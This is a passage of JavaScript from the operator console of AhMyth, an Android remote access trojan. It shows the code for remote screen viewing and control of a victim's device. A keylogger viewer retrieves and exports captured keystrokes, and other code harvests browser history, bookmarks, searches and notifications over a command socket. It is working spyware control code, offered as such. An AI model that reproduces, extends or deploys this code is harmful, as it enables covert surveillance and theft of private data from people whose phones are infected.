        });
        $ScreenCtrl.textToSend = '';
    };
    
    $ScreenCtrl.handleTextKeypress = (event) => {
        if (event.keyCode === 13) { // Enter
            $ScreenCtrl.sendText();
        }
    };
    
    // Handle keyboard events on canvas
    $ScreenCtrl.handleKeyDown = (event) => {
        if (!$ScreenCtrl.isStreaming) return;
        
        var key = event.key.toLowerCase();
        var keyCode = event.keyCode || event.which;
        
        // Handle volume and enter keys
        if (key === 'arrowup' || keyCode === 38) {
            event.preventDefault();
            $ScreenCtrl.sendKey('volumeup');
        } else if (key === 'arrowdown' || keyCode === 40) {
            event.preventDefault();
            $ScreenCtrl.sendKey('volumedown');
        } else if (key === 'enter' || keyCode === 13) {
            event.preventDefault();
            $ScreenCtrl.sendKey('enter');
        } else if (key === 'escape' || keyCode === 27) {
            event.preventDefault();
            $ScreenCtrl.sendKey('back');
        }
    };
    
    // Initialize canvas focus and keyboard listeners
    $timeout(() => {
        initCanvas();
        if (canvas) {
            // Make canvas focusable for keyboard events
            canvas.setAttribute('tabindex', '0');
            canvas.style.outline = 'none';
        }
    }, 500);
    
    // ============ Stream Controls ============
    
    $ScreenCtrl.getScreenInfo = () => {
        socket.emit(ORDER, { order: screen, extra: 'info' });
    };
    
    $ScreenCtrl.startStream = () => {
        // Don't start if permission is still required
        if ($ScreenCtrl.permissionRequired && !$ScreenCtrl.permissionGranted) {
            $rootScope.Log('[⚠] Please grant screen capture permission first', CONSTANTS.logStatus.WARNING);
            return;
        }
        
        $ScreenCtrl.isLoading = true;
        $ScreenCtrl.frameCount = 0;
        $ScreenCtrl.awaitingPermission = false;
        fpsCounter = 0;
        $rootScope.Log('[→] Starting remote desktop stream...', CONSTANTS.logStatus.INFO);
        
        // Request first frame
        socket.emit(ORDER, { order: screen, extra: 'capture' });
        
        // Set up polling for frames - but skip if awaiting permission
        streamInterval = $interval(() => {
            if ($ScreenCtrl.isStreaming && !$ScreenCtrl.awaitingPermission) {
                socket.emit(ORDER, { order: screen, extra: 'capture' });
            }
        }, parseInt($ScreenCtrl.fps));
        
        // FPS counter
        fpsTimer = $interval(() => {
            $ScreenCtrl.actualFps = fpsCounter;
            fpsCounter = 0;
        }, 1000);
        
        $ScreenCtrl.isStreaming = true;
    };
    
    $ScreenCtrl.stopStream = () => {
        $ScreenCtrl.isStreaming = false;
        $ScreenCtrl.isLoading = false;
        
        if (streamInterval) {
            $interval.cancel(streamInterval);
            streamInterval = null;
        }
        if (fpsTimer) {
            $interval.cancel(fpsTimer);
            fpsTimer = null;
        }
        $ScreenCtrl.actualFps = 0;
        
        $rootScope.Log('[→] Remote desktop stream stopped', CONSTANTS.logStatus.INFO);
    };
    
    $ScreenCtrl.captureFrame = () => {
        $ScreenCtrl.isLoading = true;
        $rootScope.Log('[→] Capturing screen...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: screen, extra: 'capture' });
    };
    
    $ScreenCtrl.refreshScreen = () => {
        socket.emit(ORDER, { order: screen, extra: 'capture' });
    };
    
    $ScreenCtrl.setQuality = () => {
        socket.emit(ORDER, { order: screen, extra: 'setQuality', quality: parseInt($ScreenCtrl.quality) });
    };
    
    $ScreenCtrl.setFps = () => {
        if (streamInterval) {
            $interval.cancel(streamInterval);
            streamInterval = $interval(() => {
                if ($ScreenCtrl.isStreaming) {
                    socket.emit(ORDER, { order: screen, extra: 'capture' });
                }
            }, parseInt($ScreenCtrl.fps));
        }
    };
    
    $ScreenCtrl.requestPermission = () => {
        $rootScope.Log('[→] Requesting screen capture permission on device...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: screen, extra: 'request' });
        
        // Show feedback
        $ScreenCtrl.permissionRequesting = true;
        $timeout(() => {
            $ScreenCtrl.permissionRequesting = false;
        }, 5000);
    };
    
    $ScreenCtrl.saveScreenshot = () => {
        if (!$ScreenCtrl.currentFrame) return;
        
        $rootScope.Log('[→] Saving screenshot...', CONSTANTS.logStatus.INFO);
        
        var base64Data = $ScreenCtrl.currentFrame;
        var filename = 'Screenshot_' + Date.now() + '.jpg';
        var filePath = path.join(downloadsPath, filename);
        
        fs.outputFile(filePath, Buffer.from(base64Data, 'base64'), (err) => {
            if (err) {
                $rootScope.Log('[✗] Failed to save screenshot', CONSTANTS.logStatus.FAIL);
            } else {
                $rootScope.Log(`[✓] Screenshot saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
            }
        });
    };
    
    // Fullscreen window reference
    var fullscreenWindow = null;
    var fullscreenUpdateInterval = null;
    
    $ScreenCtrl.openFullscreen = () => {
        try {
            if (!$ScreenCtrl.isStreaming && !$ScreenCtrl.currentFrame) {
                $rootScope.Log('[✗] No stream or frame available for fullscreen', CONSTANTS.logStatus.FAIL);
                return;
            }
            
            // Close existing fullscreen if open
            if (fullscreenWindow) {
                try {
                    if (!fullscreenWindow.isDestroyed()) {
                        fullscreenWindow.close();
                    }
                } catch (e) {
                    console.error('[AhMyth] Error closing existing fullscreen:', e);
                }
                fullscreenWindow = null;
            }
            
            if (fullscreenUpdateInterval) {
                $interval.cancel(fullscreenUpdateInterval);
                fullscreenUpdateInterval = null;
            }
            
            // Get screen dimensions
            var screenWidth = $ScreenCtrl.screenInfo.width || 1080;
            var screenHeight = $ScreenCtrl.screenInfo.height || 1920;
            
            // Calculate window size to maintain aspect ratio
            // Use remote.screen in renderer process
            var electronScreen = remote ? remote.screen : null;
            var maxWidth, maxHeight, workAreaWidth, workAreaHeight;
            
            if (electronScreen && electronScreen.getPrimaryDisplay) {
                try {
                    var display = electronScreen.getPrimaryDisplay();
                    maxWidth = display.workAreaSize.width * 0.95;
                    maxHeight = display.workAreaSize.height * 0.95;
                    workAreaWidth = display.workAreaSize.width;
                    workAreaHeight = display.workAreaSize.height;
                } catch (e) {
                    // Fallback to window dimensions
                    maxWidth = window.screen.width * 0.95;
                    maxHeight = window.screen.height * 0.95;
                    workAreaWidth = window.screen.width;
                    workAreaHeight = window.screen.height;
                }
            } else {
                // Fallback to window dimensions
                maxWidth = window.screen.width * 0.95;
                maxHeight = window.screen.height * 0.95;
                workAreaWidth = window.screen.width;
                workAreaHeight = window.screen.height;
            }
            
            var aspectRatio = screenWidth / screenHeight;
            
            var winWidth = Math.min(maxWidth, screenWidth);
            var winHeight = Math.min(maxHeight, screenHeight);
            
            if (winWidth / winHeight > aspectRatio) {
                winWidth = winHeight * aspectRatio;
            } else {
                winHeight = winWidth / aspectRatio;
            }
            
            // Center the window
            var left = (workAreaWidth - winWidth) / 2;
            var top = (workAreaHeight - winHeight) / 2;
            
            // Create fullscreen HTML content
            var fullscreenHTML = `
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Remote Desktop - Fullscreen</title>
                    <style>
                        * { margin: 0; padding: 0; box-sizing: border-box; }
                        body {
                            margin: 0;
                            background: #000;
                            display: flex;
                            align-items: center;
                            justify-content: center;
                            height: 100vh;
                            width: 100vw;
                            overflow: hidden;
                        }
                        #fullscreenCanvas {
                            max-width: 100%;
                            max-height: 100%;
                            width: auto;
                            height: auto;
                            object-fit: contain;
                            image-rendering: -webkit-optimize-contrast;
                            image-rendering: crisp-edges;
                        }
                        .status {
                            position: absolute;
                            top: 10px;
                            right: 10px;
                            padding: 4px 10px;
                            background: rgba(0,0,0,0.7);
                            color: #0f0;
                            font-family: monospace;
                            font-size: 10px;
                            border-radius: 4px;
                            z-index: 10;
                        }
                    </style>
                </head>
                <body>
                    <div class="status" id="status">LIVE</div>
                    <canvas id="fullscreenCanvas" tabindex="0"></canvas>
                    <script>
                        const { ipcRenderer } = require('electron');
                        var canvas = document.getElementById('fullscreenCanvas');
                        var ctx = canvas.getContext('2d');
                        var statusEl = document.getElementById('status');
                        var imgWidth = 0;
                        var imgHeight = 0;
                        var screenWidth = 0;
                        var screenHeight = 0;
                        
                        // Make canvas focusable for keyboard events
                        canvas.style.outline = 'none';
                        
                        function updateFrame(base64Image, width, height) {
                            var img = new Image();
                            img.onload = function() {
                                imgWidth = width || img.width;
                                imgHeight = height || img.height;
                                
                                // Calculate canvas size to fit window while maintaining aspect ratio
                                var windowWidth = window.innerWidth;
                                var windowHeight = window.innerHeight;
                                var aspectRatio = imgWidth / imgHeight;
                                var windowAspect = windowWidth / windowHeight;
                                
                                var canvasWidth, canvasHeight;
                                if (windowAspect > aspectRatio) {
                                    // Window is wider, fit to height
                                    canvasHeight = windowHeight;
                                    canvasWidth = canvasHeight * aspectRatio;
                                } else {
                                    // Window is taller, fit to width
                                    canvasWidth = windowWidth;
                                    canvasHeight = canvasWidth / aspectRatio;
                                }
                                
                                canvas.width = canvasWidth;
                                canvas.height = canvasHeight;
                                
                                // Clear and draw image
                                ctx.clearRect(0, 0, canvas.width, canvas.height);
                                ctx.drawImage(img, 0, 0, canvasWidth, canvasHeight);
                                statusEl.textContent = 'LIVE • ' + new Date().toLocaleTimeString();
                            };
                            img.onerror = function(err) {
                                console.error('[AhMyth] Failed to load frame image:', err);
                            };
                            img.src = 'data:image/jpeg;base64,' + base64Image;
                        }
                        
                        // Get canvas coordinates normalized to screen dimensions
                        function getCanvasCoords(event) {
                            var rect = canvas.getBoundingClientRect();
                            
                            // Get the actual displayed size of the canvas
                            var displayedWidth = rect.width;
                            var displayedHeight = rect.height;
                            
                            // Get the internal canvas dimensions
                            var canvasWidth = canvas.width;
                            var canvasHeight = canvas.height;
                            
                            // Calculate the scale factor between displayed and internal canvas
                            var scaleX = canvasWidth / displayedWidth;
                            var scaleY = canvasHeight / displayedHeight;
                            
                            // Get click position relative to the displayed canvas
                            var clickX = event.clientX - rect.left;
                            var clickY = event.clientY - rect.top;
                            
                            // Convert to internal canvas coordinates
                            var canvasX = clickX * scaleX;
                            var canvasY = clickY * scaleY;
                            
                            // Normalize to 0-1 range for device screen mapping
                            var normX = canvasX / canvasWidth;
                            var normY = canvasY / canvasHeight;
                            
                            // Ensure coordinates are within bounds
                            normX = Math.max(0, Math.min(1, normX));
                            normY = Math.max(0, Math.min(1, normY));
                            
                            return {
                                x: normX,
                                y: normY,
                                screenX: Math.round(normX * screenWidth),
                                screenY: Math.round(normY * screenHeight)
                            };
                        }
                        
                        // Get parent window's webContents ID for communication
                        var parentWebContentsId = null;
                        try {
                            const { remote } = require('electron');
                            if (remote && remote.getCurrentWebContents) {
                                var currentWebContents = remote.getCurrentWebContents();
                                // Get the parent window that opened this one
                                // We'll use a custom event to communicate
                            }
                        } catch (e) {}
                        
                        // Function to send input to parent window
                        function sendInputToParent(data) {
                            // Send via IPC to main process, which will forward to parent window
                            ipcRenderer.send('fullscreen-input', data);
                        }
                        
                        // Handle clicks/taps
                        canvas.addEventListener('click', function(event) {
                            var coords = getCanvasCoords(event);
                            if (coords) {
                                console.log('[AhMyth Fullscreen] Click at normalized:', coords.x, coords.y, 'Screen pixels:', coords.screenX, coords.screenY);
                                sendInputToParent({
                                    type: 'tap',
                                    x: coords.x,
                                    y: coords.y,
                                    normalized: true
                                });
                            } else {
                                console.warn('[AhMyth Fullscreen] Failed to get coordinates');
                            }
                        });
                        
                        // Handle mouse down/up for drag gestures
                        var isDragging = false;
                        var dragStart = null;
                        
                        canvas.addEventListener('mousedown', function(event) {
                            isDragging = true;
                            var coords = getCanvasCoords(event);
                            if (coords) {
                                dragStart = coords;
                            }
                        });
                        
                        canvas.addEventListener('mouseup', function(event) {
                            if (isDragging && dragStart) {
                                var coords = getCanvasCoords(event);
                                if (coords && (Math.abs(coords.x - dragStart.x) > 0.01 || Math.abs(coords.y - dragStart.y) > 0.01)) {
                                    // Swipe gesture
                                    sendInputToParent({
                                        type: 'swipe',
                                        startX: dragStart.x,
                                        startY: dragStart.y,
                                        endX: coords.x,
                                        endY: coords.y,
                                        normalized: true
                                    });
                                }
                            }
                            isDragging = false;
                            dragStart = null;
                        });
                        
                        // Handle keyboard events
                        canvas.addEventListener('keydown', function(event) {
                            var keyMap = {
                                'ArrowUp': 'volumeup',
                                'ArrowDown': 'volumedown',
                                'Enter': 'enter',
                                'Escape': 'back'
                            };
                            
                            var key = keyMap[event.key];
                            if (key) {
                                event.preventDefault();
                                sendInputToParent({
                                    type: 'key',
                                    key: key
                                });
                            }
                        });
                        
                        // Listen for frame updates via IPC
                        ipcRenderer.on('update-frame', (event, data) => {
                            if (data && data.image) {
                                updateFrame(data.image, data.width, data.height);
                                // Store screen dimensions for coordinate mapping
                                if (data.width && data.height) {
                                    screenWidth = data.width;
                                    screenHeight = data.height;
                                }
                            }
                        });
                        
                        // Handle window resize
                        window.addEventListener('resize', function() {
                            if (imgWidth > 0 && imgHeight > 0) {
                                // Redraw last frame with new size
                                var lastFrame = canvas.toDataURL();
                                if (lastFrame && lastFrame !== 'data:,') {
                                    var img = new Image();
                                    img.onload = function() {
                                        var windowWidth = window.innerWidth;
                                        var windowHeight = window.innerHeight;
                                        var aspectRatio = imgWidth / imgHeight;
                                        var windowAspect = windowWidth / windowHeight;
                                        
                                        var canvasWidth, canvasHeight;
                                        if (windowAspect > aspectRatio) {
                                            canvasHeight = windowHeight;
                                            canvasWidth = canvasHeight * aspectRatio;
                                        } else {
                                            canvasWidth = windowWidth;
                                            canvasHeight = canvasWidth / aspectRatio;
                                        }
                                        
                                        canvas.width = canvasWidth;
                                        canvas.height = canvasHeight;
                                        ctx.drawImage(img, 0, 0, canvasWidth, canvasHeight);
                                    };
                                    img.src = lastFrame;
                                }
                            }
                        });
                    </script>
                </body>
                </html>
            `;
            
            // Set up handler for fullscreen input events forwarded from main process
            ipcRenderer.on('fullscreen-input-event', (event, data) => {
                console.log('[AhMyth] Fullscreen input received:', data);
                if (data.type === 'tap') {
                    console.log('[AhMyth] Sending tap to device:', data.x, data.y);
                    socket.emit(ORDER, {
                        order: input,
                        action: 'tap',
                        x: data.x,
                        y: data.y,
                        normalized: true
                    });
                } else if (data.type === 'swipe') {
                    socket.emit(ORDER, {
                        order: input,
                        action: 'swipe',
                        startX: data.startX,
                        startY: data.startY,
                        endX: data.endX,
                        endY: data.endY,
                        normalized: true
                    });
                } else if (data.type === 'key') {
                    $ScreenCtrl.sendKey(data.key);
                }
            });
            
            // Create Electron BrowserWindow
            if (!remote || !remote.BrowserWindow) {
                $rootScope.Log('[✗] Failed to access Electron BrowserWindow API', CONSTANTS.logStatus.FAIL);
                console.error('[AhMyth] remote.BrowserWindow is not available');
                return;
            }
            
            const { BrowserWindow } = remote;
            
            // Get current window (lab window) to set as parent
            var currentWindow = null;
            try {
                currentWindow = remote.getCurrentWindow();
            } catch (e) {
                console.error('[AhMyth] Could not get current window:', e);
            }
            
            fullscreenWindow = new BrowserWindow({
                width: Math.round(winWidth),
                height: Math.round(winHeight),
                x: Math.round(left),
                y: Math.round(top),
                frame: true,
                backgroundColor: '#000000',
                parent: currentWindow, // Set parent window
                webPreferences: {
                    nodeIntegration: true,
                    contextIsolation: false,
                    enableRemoteModule: true
                }
            });
            
            // Register fullscreen window with parent in main process
            if (currentWindow) {
                try {
                    ipcRenderer.send('register-fullscreen-window', {
                        fullscreenId: fullscreenWindow.id,
                        parentId: currentWindow.webContents.id
                    });
                } catch (e) {
                    console.error('[AhMyth] Could not register fullscreen window:', e);
                }
            }
            
            // Write HTML content to window
            fullscreenWindow.loadURL('data:text/html;charset=utf-8,' + encodeURIComponent(fullscreenHTML));
            
            // Handle window close
            fullscreenWindow.on('closed', () => {
                // Unregister fullscreen window
                try {
                    ipcRenderer.send('unregister-fullscreen-window', fullscreenWindow.id);
                } catch (e) {}
                
                if (fullscreenUpdateInterval) {
                    $interval.cancel(fullscreenUpdateInterval);
                    fullscreenUpdateInterval = null;
                }
                fullscreenWindow = null;
            });
            
            // Wait for window to be ready, then send initial frame
            fullscreenWindow.webContents.once('did-finish-load', () => {
                // Send initial frame
                if ($ScreenCtrl.currentFrame) {
                    updateFullscreenFrame();
                }
                
                // Set up interval to update fullscreen window with new frames
                if ($ScreenCtrl.isStreaming) {
                    fullscreenUpdateInterval = $interval(() => {
                        if (fullscreenWindow && !fullscreenWindow.isDestroyed() && $ScreenCtrl.currentFrame) {
                            updateFullscreenFrame();
                        } else {
                            if (fullscreenUpdateInterval) {
                                $interval.cancel(fullscreenUpdateInterval);
                                fullscreenUpdateInterval = null;
                            }
                        }
                    }, parseInt($ScreenCtrl.fps) || 100);
                }
            });
            
            fullscreenWindow.show();
            $rootScope.Log('[✓] Fullscreen window opened', CONSTANTS.logStatus.SUCCESS);
        } catch (error) {
            console.error('[AhMyth] Error opening fullscreen:', error);
            $rootScope.Log('[✗] Failed to open fullscreen: ' + error.message, CONSTANTS.logStatus.FAIL);
        }
    };
    
    function updateFullscreenFrame() {
        if (!fullscreenWindow || fullscreenWindow.isDestroyed()) return;
        if (!$ScreenCtrl.currentFrame) return;
        
        try {
            // Send frame via IPC to the fullscreen window
            fullscreenWindow.webContents.send('update-frame', {
                image: $ScreenCtrl.currentFrame,
                width: $ScreenCtrl.screenInfo.width || (canvas ? canvas.width : 1080),
                height: $ScreenCtrl.screenInfo.height || (canvas ? canvas.height : 1920)
            });
        } catch (e) {
            console.error('[AhMyth] Failed to update fullscreen frame:', e);
        }
    }
    
    // Auto-retry on permission grant
    $rootScope.$on('PermissionGranted', (event, permission) => {
        if (permission.toLowerCase().includes('screen') && $ScreenCtrl.awaitingPermission) {
            $rootScope.Log('[→] Permission granted! Starting screen stream...', CONSTANTS.logStatus.INFO);
            $ScreenCtrl.permissionGranted = true;
            $ScreenCtrl.awaitingPermission = false;
            $ScreenCtrl.startStream();
        }
    });

    // ============ Socket Handlers ============
    
    socket.on(screen, (data) => {
        $ScreenCtrl.isLoading = false;
        
        if (data.success === false) {
            if (data.permissionRequested) {
                // Permission dialog was shown on device - STOP spamming
                if (!$ScreenCtrl.awaitingPermission) {
                    $rootScope.Log('[✓] Permission dialog shown on device. User must tap "Start Now"', CONSTANTS.logStatus.SUCCESS);
                }
                $ScreenCtrl.permissionRequired = true;
                $ScreenCtrl.awaitingPermission = true;  // Stop sending capture requests
                $ScreenCtrl.permissionGranted = false;
                
                // Stop the stream interval to prevent spam
                if (streamInterval) {
                    $interval.cancel(streamInterval);
                    streamInterval = null;
                }
            } else if (data.error && data.error.toLowerCase().includes('permission')) {
                if (!$ScreenCtrl.awaitingPermission) {
                    $ScreenCtrl.permissionRequired = true;
                    $ScreenCtrl.awaitingPermission = true;
                    $rootScope.Log('[⚠] Screen capture permission required on device', CONSTANTS.logStatus.WARNING);
                    
                    // Stop the stream interval
                    if (streamInterval) {
                        $interval.cancel(streamInterval);
                        streamInterval = null;
                    }
                }
            } else if (data.error && (data.error.toLowerCase().includes('no image') || data.error.toLowerCase().includes('unavailable'))) {
                // Don't stop streaming on temporary image errors - just log and continue
                $rootScope.Log('[⚠] Waiting for screen data...', CONSTANTS.logStatus.WARNING);
                // Don't stop streaming, just wait for next frame
            } else {
                $rootScope.Log(`[✗] Screen error: ${data.error || 'Unknown'}`, CONSTANTS.logStatus.FAIL);
                // Only stop streaming on critical errors, not temporary ones
                if (data.error && !data.error.toLowerCase().includes('timeout')) {
                    if ($ScreenCtrl.isStreaming) {
                        // Don't auto-stop, let user decide
                    }
                }
            }
        } else if (data.message && data.message.includes('permission')) {
            // Permission request sent successfully
            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
            if (data.instruction) {
                $rootScope.Log(`[→] ${data.instruction}`, CONSTANTS.logStatus.INFO);
            }
        } else if (data.image) {
            $ScreenCtrl.frameCount++;
            $ScreenCtrl.lastFrameSize = (data.size / 1024).toFixed(1);
            $ScreenCtrl.permissionRequired = false;
            
            // Update screen dimensions if provided
            if (data.width && data.height) {
                $ScreenCtrl.screenInfo.width = data.width;
                $ScreenCtrl.screenInfo.height = data.height;
            }
            
            // Update fullscreen window if open
            if (fullscreenWindow && !fullscreenWindow.isDestroyed()) {
                updateFullscreenFrame();
            }
            $ScreenCtrl.awaitingPermission = false;
            $ScreenCtrl.permissionGranted = true;
            
            // Restart stream interval if it was stopped due to permission
            if ($ScreenCtrl.isStreaming && !streamInterval) {
                streamInterval = $interval(() => {
                    if ($ScreenCtrl.isStreaming && !$ScreenCtrl.awaitingPermission) {
                        socket.emit(ORDER, { order: screen, extra: 'capture' });
                    }
                }, parseInt($ScreenCtrl.fps));
            }
            
            // Update screen info from frame
            if (data.width && data.height) {
                $ScreenCtrl.screenInfo.width = data.width;
                $ScreenCtrl.screenInfo.height = data.height;
            }
            
            renderFrame(data.image, data.width, data.height);
            
            if ($ScreenCtrl.frameCount === 1) {
                $rootScope.Log('[✓] Remote desktop active', CONSTANTS.logStatus.SUCCESS);
            }
        } else if (data.width && data.height && !data.image) {
            $ScreenCtrl.screenInfo = data;
            $rootScope.Log(`[✓] Screen: ${data.width}x${data.height}`, CONSTANTS.logStatus.SUCCESS);
        } else if (data.quality) {
            $rootScope.Log(`[✓] Quality: ${data.quality}%`, CONSTANTS.logStatus.SUCCESS);
        } else if (data.isCapturing !== undefined) {
            // Status response
            $rootScope.Log(`[✓] Screen capture status: ${data.isCapturing ? 'Active' : 'Inactive'}`, CONSTANTS.logStatus.INFO);
            if (data.isCapturing) {
                $ScreenCtrl.permissionRequired = false;
            }
        } else {
            console.log('[AhMyth] Received screen data:', data);
        }
        
        if (!$ScreenCtrl.$$phase) {
            $ScreenCtrl.$apply();
        }
    });
    
    socket.on(input, (data) => {
        if (data.success) {
            // Input command succeeded
        } else {
            $rootScope.Log(`[✗] Input failed: ${data.error || 'Unknown'}`, CONSTANTS.logStatus.FAIL);
        }
    });
    
    // Initialize
    setTimeout(() => {
        initCanvas();
        $ScreenCtrl.getScreenInfo();
    }, 100);
});

//-----------------------Keylogger Controller------------------------
app.controller("KeyloggerCtrl", function ($scope, $rootScope) {
    $KeyloggerCtrl = $scope;
    $KeyloggerCtrl.keylogs = [];
    $KeyloggerCtrl.isLoading = false;
    $KeyloggerCtrl.keyloggerEnabled = false;
    $KeyloggerCtrl.keylogCount = 0;
    $KeyloggerCtrl.uniqueApps = [];
    $KeyloggerCtrl.barLimit = 50;
    
    var keylogger = CONSTANTS.orders.keylogger || 'x0000kl';

    $KeyloggerCtrl.$on('$destroy', () => {
        socket.removeAllListeners(keylogger);
    });

    $KeyloggerCtrl.getKeylogs = () => {
        $KeyloggerCtrl.isLoading = true;
        $rootScope.Log('[→] Fetching keylogs...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: keylogger, extra: 'get' });
    };

    $KeyloggerCtrl.clearKeylogs = () => {
        $KeyloggerCtrl.keylogs = [];
        $KeyloggerCtrl.keylogCount = 0;
        $KeyloggerCtrl.uniqueApps = [];
        $rootScope.Log('[→] Clearing keylogs...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: keylogger, extra: 'clear' });
    };

    $KeyloggerCtrl.exportKeylogs = () => {
        if ($KeyloggerCtrl.keylogs.length === 0) return;
        
        var content = "Timestamp,App,Type,Content\n";
        $KeyloggerCtrl.keylogs.forEach(log => {
            content += `${new Date(log.timestamp).toLocaleString()},${log.app},${log.type},"${log.content.replace(/"/g, '""')}"\n`;
        });
        
        var filePath = path.join(downloadsPath, "Keylogs_" + Date.now() + ".csv");
        fs.outputFile(filePath, content, (err) => {
            if (err)
                $rootScope.Log('[✗] Failed to export keylogs', CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Keylogs exported: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
        });
    };

    $KeyloggerCtrl.increaseLimit = () => {
        $KeyloggerCtrl.barLimit += 50;
    };

    $KeyloggerCtrl.getTypeIcon = (type) => {
        switch(type) {
            case 'TEXT': return 'keyboard icon';
            case 'WINDOW': return 'window maximize icon';
            case 'NOTIFICATION': return 'bell icon';
            default: return 'file alternate icon';
        }
    };

    $KeyloggerCtrl.copyLog = (log) => {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(log.content);
            $rootScope.Log('[✓] Copied to clipboard', CONSTANTS.logStatus.SUCCESS);
        }
    };

    socket.on(keylogger, (data) => {
        $KeyloggerCtrl.isLoading = false;
        
        if (data.logs) {
            $KeyloggerCtrl.keylogs = data.logs;
            $KeyloggerCtrl.keylogCount = data.logs.length;
            $KeyloggerCtrl.keyloggerEnabled = data.enabled;
            
            // Extract unique apps
            const apps = new Set(data.logs.map(l => l.app));
            $KeyloggerCtrl.uniqueApps = Array.from(apps).sort();
            
            $rootScope.Log(`[✓] Received ${data.logs.length} keylogs`, CONSTANTS.logStatus.SUCCESS);
            $KeyloggerCtrl.$apply();
        } else if (data.status) {
            $KeyloggerCtrl.keyloggerEnabled = data.enabled;
            $KeyloggerCtrl.$apply();
        }
    });

    // Initial load
    $KeyloggerCtrl.getKeylogs();
});

//-----------------------Browser History Controller------------------------
app.controller("BrowserHistoryCtrl", function ($scope, $rootScope) {
    $BrowserCtrl = $scope;
    $BrowserCtrl.history = [];
    $BrowserCtrl.bookmarks = [];
    $BrowserCtrl.searches = [];
    $BrowserCtrl.isLoading = false;
    $BrowserCtrl.activeTab = 'history';
    $BrowserCtrl.barLimit = 50;
    
    var browserHistory = CONSTANTS.orders.browserHistory || 'x0000bh';

    $BrowserCtrl.$on('$destroy', () => {
        socket.removeAllListeners(browserHistory);
    });

    $BrowserCtrl.getHistory = () => {
        $BrowserCtrl.isLoading = true;
        $rootScope.Log('[→] Fetching browser data...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: browserHistory });
    };

    $BrowserCtrl.exportHistory = () => {
        var content = "";
        
        if ($BrowserCtrl.activeTab === 'history') {
            content = "Date,Title,URL,Visits\n";
            $BrowserCtrl.history.forEach(item => {
                content += `${new Date(item.date).toLocaleString()},"${(item.title||'').replace(/"/g, '""')}","${item.url}",${item.visits}\n`;
            });
        } else if ($BrowserCtrl.activeTab === 'bookmarks') {
            content = "Created,Title,URL\n";
            $BrowserCtrl.bookmarks.forEach(item => {
                content += `${new Date(item.created).toLocaleString()},"${(item.title||'').replace(/"/g, '""')}","${item.url}"\n`;
            });
        } else {
            content = "Date,Query\n";
            $BrowserCtrl.searches.forEach(item => {
                content += `${new Date(item.date).toLocaleString()},"${(item.query||'').replace(/"/g, '""')}"\n`;
            });
        }
        
        var filePath = path.join(downloadsPath, "Browser_" + $BrowserCtrl.activeTab + "_" + Date.now() + ".csv");
        fs.outputFile(filePath, content, (err) => {
            if (err)
                $rootScope.Log('[✗] Failed to export data', CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Data exported: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
        });
    };

    $BrowserCtrl.increaseLimit = () => {
        $BrowserCtrl.barLimit += 50;
    };

    socket.on(browserHistory, (data) => {
        $BrowserCtrl.isLoading = false;
        
        if (data.history) {
            $BrowserCtrl.history = data.history;
            $BrowserCtrl.bookmarks = data.bookmarks || [];
            $BrowserCtrl.searches = data.searches || [];
            
            $rootScope.Log(`[✓] Received browser data: ${data.history.length} history items`, CONSTANTS.logStatus.SUCCESS);
            $BrowserCtrl.$apply();
        } else {
            $rootScope.Log('[⚠] No browser data found or permission denied', CONSTANTS.logStatus.WARNING);
        }
    });

    // Initial load
    $BrowserCtrl.getHistory();
});

//-----------------------Notifications Controller------------------------
app.controller("NotificationsCtrl", function ($scope, $rootScope) {
    $NotifCtrl = $scope;
    $NotifCtrl.notifications = [];
    $NotifCtrl.isLoading = false;
    $NotifCtrl.notificationEnabled = false;
    $NotifCtrl.notificationCount = 0;
    $NotifCtrl.uniqueApps = [];
    $NotifCtrl.barLimit = 50;
    
    var notifications = CONSTANTS.orders.notifications || 'x0000nt';

    $NotifCtrl.$on('$destroy', () => {
        socket.removeAllListeners(notifications);
    });

    $NotifCtrl.getNotifications = () => {
        $NotifCtrl.isLoading = true;
        $rootScope.Log('[→] Fetching notifications...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: notifications, extra: 'all' });
    };

    $NotifCtrl.getActiveNotifications = () => {
        $NotifCtrl.isLoading = true;
        $rootScope.Log('[→] Fetching active notifications...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: notifications, extra: 'active' });
    };

    $NotifCtrl.clearNotifications = () => {
        $NotifCtrl.notifications = [];
        $NotifCtrl.notificationCount = 0;
        $rootScope.Log('[→] Clearing notifications...', CONSTANTS.logStatus.INFO);
        // Note: This only clears local view, usually we don't clear on device unless specified
    };

    $NotifCtrl.exportNotifications = () => {
        if ($NotifCtrl.notifications.length === 0) return;
        
        var content = "Timestamp,App,Title,Text,Action\n";
        $NotifCtrl.notifications.forEach(n => {
            content += `${new Date(n.timestamp).toLocaleString()},${n.appName},"${(n.title||'').replace(/"/g, '""')}","${(n.text||'').replace(/"/g, '""')}",${n.action}\n`;
        });
        
        var filePath = path.join(downloadsPath, "Notifications_" + Date.now() + ".csv");
        fs.outputFile(filePath, content, (err) => {
            if (err)
                $rootScope.Log('[✗] Failed to export notifications', CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Notifications exported: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
        });
    };

    $NotifCtrl.increaseLimit = () => {
        $NotifCtrl.barLimit += 50;
    };

    socket.on(notifications, (data) => {
        $NotifCtrl.isLoading = false;
        
        if (data.notifications) {
            $NotifCtrl.notifications = data.notifications;
            $NotifCtrl.notificationCount = data.notifications.length;
            $NotifCtrl.notificationEnabled = data.enabled;
            
            // Extract unique apps
            const apps = new Set(data.notifications.map(n => n.appName));
            $NotifCtrl.uniqueApps = Array.from(apps).sort();
            
            $rootScope.Log(`[✓] Received ${data.notifications.length} notifications`, CONSTANTS.logStatus.SUCCESS);
            $NotifCtrl.$apply();
        } else if (data.status) {
            $NotifCtrl.notificationEnabled = data.enabled;
            $NotifCtrl.$apply();
        }
    });

    // Initial load
    $NotifCtrl.getNotifications();
});

